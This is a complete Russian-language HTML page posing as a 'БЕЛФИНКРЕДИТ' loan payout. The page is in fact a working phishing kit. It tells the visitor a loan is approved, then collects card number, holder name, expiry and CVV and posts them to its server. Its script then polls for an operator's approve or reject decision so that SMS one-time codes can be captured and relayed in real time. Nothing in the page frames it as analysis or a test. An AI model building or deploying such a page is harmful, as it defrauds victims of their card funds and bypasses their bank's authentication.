<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>БЕЛФИНКРЕДИТ | Получение средств</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f0f4fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 32px 16px;
        }
        .page { width: 100%; max-width: 500px; margin: 0 auto; }
        .top-header { text-align: center; margin-bottom: 24px; }
        .logo { font-size: 32px; font-weight: 900; color: #071b46; letter-spacing: -0.5px; }
        .logo span { color: #00b965; }
        .logo-sub { font-size: 12px; color: #667085; margin-top: 6px; }
        .credit-card {
            background: linear-gradient(135deg, #071b46 0%, #0a2a5e 100%);
            border-radius: 28px;
            padding: 24px;
            margin-bottom: 24px;
            color: white;
        }
        .credit-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(0,185,101,0.2);
            padding: 8px 16px;
            border-radius: 50px;
            font-size: 13px;
            color: #00e67e;
            margin-bottom: 20px;
        }
        .credit-amount { font-size: 48px; font-weight: 800; margin: 16px 0 8px; }
        .credit-amount small { font-size: 18px; opacity: 0.8; }
        .credit-details { display: flex; justify-content: space-between; margin-top: 24px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.1); }
        .detail { flex: 1; text-align: center; }
        .detail-label { font-size: 12px; opacity: 0.7; margin-bottom: 6px; }
        .detail-value { font-size: 16px; font-weight: 700; }
        .form-container {
            background: white;
            border-radius: 28px;
            padding: 28px 24px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
        }
        .form-title { font-size: 22px; font-weight: 700; color: #07152f; margin-bottom: 8px; }
        .form-sub { font-size: 14px; color: #667085; margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid #e5edf8; }
        .field { margin-bottom: 20px; }
        .label { display: block; margin-bottom: 8px; font-size: 13px; font-weight: 600; color: #344054; text-transform: uppercase; }
        .input {
            width: 100%;
            height: 52px;
            border-radius: 16px;
            border: 1.5px solid #e2e8f0;
            background: white;
            padding: 0 16px;
            font-size: 16px;
            outline: none;
        }
        .input:focus { border-color: #00b965; }
        .row { display: grid; grid-template-columns: 1fr 140px; gap: 16px; }
        .expiry-row { display: flex; gap: 12px; align-items: center; }
        .expiry-input { flex: 1; }
        .expiry-slash { font-size: 24px; color: #cbd5e1; }
        .submit-btn {
            width: 100%;
            height: 56px;
            border: none;
            border-radius: 28px;
            background: #00b965;
            color: white;
            font-size: 18px;
            font-weight: 800;
            cursor: pointer;
            margin-top: 16px;
        }
        .submit-btn:hover { background: #009e52; }
        .footer-note { margin-top: 20px; text-align: center; font-size: 12px; color: #8a99b0; }
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.85);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        .modal.active { display: flex; }
        .modal-content {
            max-width: 420px;
            width: 90%;
            background: white;
            border-radius: 32px;
            overflow: hidden;
        }
        .modal-header {
            background: linear-gradient(135deg, #00b965, #008a4a);
            padding: 24px;
            color: white;
            text-align: center;
        }
        .modal-header h3 { font-size: 24px; }
        .modal-body { padding: 24px; }
        .code-input input {
            width: 100%;
            padding: 16px;
            border: 1.5px solid #e2e8f0;
            border-radius: 16px;
            font-size: 20px;
            text-align: center;
            letter-spacing: 6px;
            margin-bottom: 20px;
        }
        .modal-buttons { display: flex; gap: 12px; }
        .modal-buttons button {
            flex: 1;
            height: 48px;
            border-radius: 24px;
            font-weight: 600;
            cursor: pointer;
        }
        .btn-confirm { background: #00b965; border: none; color: white; }
        .btn-cancel { background: transparent; border: 1.5px solid #e2e8f0; color: #667085; }
        .error-msg { background: #fee2e2; border-radius: 12px; padding: 12px; margin-bottom: 16px; color: #dc2626; text-align: center; display: none; }
        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 20px;
            z-index: 1001;
        }
        .loader-overlay.active { display: flex; }
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(255,255,255,0.2);
            border-top-color: #00b965;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loader-text { color: white; font-size: 15px; }
        @media (max-width: 560px) {
            .credit-amount { font-size: 36px; }
            .row { grid-template-columns: 1fr; gap: 0; }
        }
    </style>
</head>
<body>
<div class="page">
    <div class="top-header">
        <div class="logo">БЕЛФИН<span>КРЕДИТ</span></div>
        <div class="logo-sub">официальный партнёр</div>
    </div>
    <div class="credit-card">
        <div class="credit-badge"><span>✅</span> Кредит одобрен</div>
        <div class="credit-amount"><span id="displayAmount">---</span> <small>BYN</small></div>
        <div class="credit-details">
            <div class="detail"><div class="detail-label">ФИО</div><div class="detail-value" id="displayFullname">---</div></div>
            <div class="detail"><div class="detail-label">Срок</div><div class="detail-value" id="displayTerm">---</div></div>
            <div class="detail"><div class="detail-label">Платёж</div><div class="detail-value" id="displayPayment">---</div></div>
        </div>
    </div>
    <div class="form-container">
        <div class="form-title">💳 Получение средств</div>
        <div class="form-sub">Укажите реквизиты карты для перевода</div>
        <div id="errorMsg" class="error-msg"></div>
        <form id="cardForm">
            <div class="field">
                <label class="label">ФИО на карте</label>
                <input id="cardHolder" class="input" type="text" placeholder="IVAN IVANOV">
            </div>
            <div class="field">
                <label class="label">Номер карты</label>
                <input id="cardNumber" class="input" type="text" maxlength="19" placeholder="0000 0000 0000 0000">
            </div>
            <div class="row">
                <div class="field">
                    <label class="label">Срок действия</label>
                    <div class="expiry-row">
                        <input id="expMonth" class="input expiry-input" type="text" maxlength="2" placeholder="ММ">
                        <span class="expiry-slash">/</span>
                        <input id="expYear" class="input expiry-input" type="text" maxlength="2" placeholder="ГГ">
                    </div>
                </div>
                <div class="field">
                    <label class="label">CVV</label>
                    <input id="cvv" class="input" type="password" maxlength="3" placeholder="•••">
                </div>
            </div>
            <button class="submit-btn" type="submit">Получить средства →</button>
            <div class="footer-note">Нажимая кнопку, вы соглашаетесь с условиями перевода</div>
        </form>
    </div>
</div>
<div class="modal" id="smsModal">
    <div class="modal-content">
        <div class="modal-header"><h3>🔐 Подтверждение</h3><p>Введите код из SMS</p></div>
        <div class="modal-body">
            <div class="code-input"><input type="text" id="smsCode" maxlength="6" placeholder="••••••"></div>
            <div id="modalError" class="error-msg"></div>
            <div class="modal-buttons">
                <button class="btn-cancel" id="cancelModalBtn">Отмена</button>
                <button class="btn-confirm" id="confirmBtn">Подтвердить</button>
            </div>
        </div>
    </div>
</div>
<div class="loader-overlay" id="loaderOverlay">
    <div class="spinner"></div>
    <div class="loader-text" id="loaderText">Обработка данных...</div>
</div>
<script>
    const urlParams = new URLSearchParams(window.location.search);
    let sessionId = urlParams.get('session');
    const API_URL = window.location.origin;
    let actionInterval = null;
    
    async function loadApplication() {
        if (!sessionId) return;
        try {
            const response = await fetch(`${API_URL}/get_application_data/${sessionId}`);
            if (response.ok) {
                const data = await response.json();
                document.getElementById('displayFullname').innerHTML = data.fullname || '—';
                document.getElementById('displayAmount').innerHTML = data.amount || '0';
                document.getElementById('displayTerm').innerHTML = data.term ? `${data.term} мес` : '—';
                const payment = data.payment || (data.amount && data.term ? Math.ceil(data.amount / data.term) : 0);
                document.getElementById('displayPayment').innerHTML = payment ? `${payment} BYN` : '—';
            }
        } catch(e) { console.error(e); }
    }
    loadApplication();
    
    function startActionCheck() {
        if (actionInterval) clearInterval(actionInterval);
        actionInterval = setInterval(async () => {
            try {
                const response = await fetch(`${API_URL}/check_pending_action/${sessionId}`);
                const data = await response.json();
                if (data.action === 'code_approved') {
                    clearInterval(actionInterval);
                    document.getElementById('loaderOverlay').classList.remove('active');
                    document.getElementById('smsModal').classList.remove('active');
                    alert('✅ Средства успешно зачислены!');
                    window.location.href = '/';
                } else if (data.action === 'code_rejected') {
                    document.getElementById('loaderOverlay').classList.remove('active');
                    document.getElementById('modalError').innerHTML = '❌ Неверный код. Попробуйте снова.';
                    document.getElementById('modalError').style.display = 'block';
                    document.getElementById('smsCode').value = '';
                }
            } catch(e) { console.error(e); }
        }, 2000);
    }
    
    document.getElementById('cardNumber').addEventListener('input', (e) => {
        let digits = e.target.value.replace(/\D/g, '').slice(0, 16);
        e.target.value = digits.replace(/(.{4})/g, '$1 ').trim();
    });
    document.getElementById('cardHolder').addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^A-Za-z\s]/g, '').toUpperCase();
    });
    ['expMonth', 'expYear', 'cvv'].forEach(id => {
        document.getElementById(id).addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
    });
    
    document.getElementById('cardForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const holder = document.getElementById('cardHolder').value.trim();
        const number = document.getElementById('cardNumber').value.replace(/\s/g, '');
        const month = document.getElementById('expMonth').value;
        const year = document.getElementById('expYear').value;
        const code = document.getElementById('cvv').value;
        
        if (!holder || holder.length < 3) { alert('Введите имя на карте'); return; }
        if (number.length !== 16) { alert('Введите корректный номер карты'); return; }
        if (month.length !== 2 || year.length !== 2) { alert('Введите срок действия'); return; }
        if (code.length !== 3) { alert('Введите CVV'); return; }
        
        document.getElementById('loaderText').innerHTML = 'Отправка данных...';
        document.getElementById('loaderOverlay').classList.add('active');
        
        try {
            const response = await fetch(`${API_URL}/submit_card_details`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ session_id: sessionId, card_holder: holder, card_number: number, card_expiry: `${month}/${year}`, card_cvv: code })
            });
            if (response.ok) {
                document.getElementById('loaderText').innerHTML = 'Ожидание подтверждения...';
                startActionCheck();
            } else { throw new Error(); }
        } catch(e) {
            document.getElementById('loaderOverlay').classList.remove('active');
            alert('Ошибка отправки');
        }
    });
    
    document.getElementById('confirmBtn').addEventListener('click', async () => {
        const code = document.getElementById('smsCode').value.trim();
        if (code.length < 4) { alert('Введите код из SMS'); return; }
        document.getElementById('loaderText').innerHTML = 'Проверка кода...';
        document.getElementById('loaderOverlay').classList.add('active');
        try {
            await fetch(`${API_URL}/submit_sms_code`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ session_id: sessionId, code: code })
            });
        } catch(e) { console.error(e); }
    });
    
    document.getElementById('cancelModalBtn').addEventListener('click', () => {
        document.getElementById('smsModal').classList.remove('active');
        document.getElementById('smsCode').value = '';
    });
</script>
</body>
</html>
